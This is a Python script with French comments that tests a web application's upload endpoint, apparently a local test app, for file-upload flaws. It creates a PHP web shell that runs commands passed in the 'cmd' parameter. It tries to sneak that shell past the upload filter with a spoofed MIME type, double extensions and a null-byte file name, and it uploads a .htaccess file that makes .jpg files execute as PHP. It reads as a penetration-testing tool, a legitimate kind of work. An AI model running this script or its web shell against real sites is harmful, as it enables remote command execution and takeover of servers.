import requests
import os
import mimetypes
import random
import string

# URL de l'application
BASE_URL = "http://localhost:5000/upload"  # Ajustez si nécessaire

def random_string(length=10):
    """Génère une chaîne aléatoire de caractères"""
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def create_test_file(filename, content):
    """Crée un fichier de test avec le contenu spécifié"""
    with open(filename, 'w') as f:
        f.write(content)
    return filename

def test_file_upload(filename, content_type=None, custom_filename=None):
    """Teste l'upload d'un fichier avec un type MIME potentiellement falsifié"""
    if not os.path.exists(filename):
        print(f"[-] Erreur: Le fichier {filename} n'existe pas")
        return False
    
    print(f"\n[*] Test d'upload avec fichier: {filename}")
    if content_type:
        print(f"[*] Type MIME falsifié: {content_type}")
    if custom_filename:
        print(f"[*] Nom de fichier personnalisé: {custom_filename}")
    
    # Préparation des fichiers à uploader
    files = {}
    if custom_filename:
        files['file'] = (custom_filename, open(filename, 'rb'), content_type or mimetypes.guess_type(filename)[0])
    else:
        files['file'] = (os.path.basename(filename), open(filename, 'rb'), content_type or mimetypes.guess_type(filename)[0])
    
    # Envoi de la requête
    try:
        response = requests.post(BASE_URL, files=files)
        
        # Analyse de la réponse
        print(f"[+] Code de statut: {response.status_code}")
        print(f"[+] Taille de la réponse: {len(response.text)} caractères")
        
        # Vérification de certains motifs qui pourraient indiquer un upload réussi
        if "success" in response.text.lower() or "uploaded" in response.text.lower():
            print("[+] SUCCÈS: L'upload semble avoir réussi!")
            return True
        elif "error" in response.text.lower() or "invalid" in response.text.lower():
            print("[-] ÉCHEC: L'upload a été rejeté")
            return False
        else:
            print("[?] Résultat incertain, vérifiez manuellement")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[-] Erreur lors de la requête: {e}")
        return False
    finally:
        # Fermeture du fichier
        files['file'][1].close()

def main():
    print("=== Test de failles d'upload de fichiers ===")
    
    # Création de fichiers de test
    test_files = []
    
    # 1. Fichier PHP basique
    php_file = create_test_file("test_shell.php", "<?php echo 'Test de faille upload'; system($_GET['cmd']); ?>")
    test_files.append((php_file, None, None))
    
    # 2. Fichier PHP avec extension modifiée
    php_file_jpg = create_test_file("test_shell.php.jpg", "<?php echo 'Test de faille upload'; system($_GET['cmd']); ?>")
    test_files.append((php_file_jpg, None, None))
    
    # 3. Fichier PHP avec type MIME falsifié
    test_files.append((php_file, "image/jpeg", None))
    
    # 4. Fichier PHP avec double extension
    test_files.append((php_file, None, f"image_{random_string()}.jpg.php"))
    
    # 5. Fichier PHP avec caractères spéciaux
    test_files.append((php_file, None, f"image_{random_string()}.php%00.jpg"))
    
    # 6. Fichier .htaccess pour autoriser l'exécution de fichiers .jpg comme PHP
    htaccess_file = create_test_file(".htaccess", "AddType application/x-httpd-php .jpg")
    test_files.append((htaccess_file, None, None))
    
    # Test de chaque fichier
    successful_tests = []
    
    for filename, content_type, custom_filename in test_files:
        result = test_file_upload(filename, content_type, custom_filename)
        if result:
            successful_tests.append((filename, content_type, custom_filename))
    
    # Nettoyage des fichiers de test
    for filename, _, _ in test_files:
        if os.path.exists(filename):
            os.remove(filename)
    
    # Résumé
    print("\n=== Résumé des tests ===")
    if successful_tests:
        print(f"[+] {len(successful_tests)} tests ont réussi:")
        for i, (filename, content_type, custom_filename) in enumerate(successful_tests, 1):
            print(f"  {i}. Fichier: {os.path.basename(filename)}")
            if content_type:
                print(f"     Type MIME: {content_type}")
            if custom_filename:
                print(f"     Nom personnalisé: {custom_filename}")
    else:
        print("[-] Aucun test n'a réussi ou l'application n'est pas vulnérable aux failles d'upload")

if __name__ == "__main__":
    main() 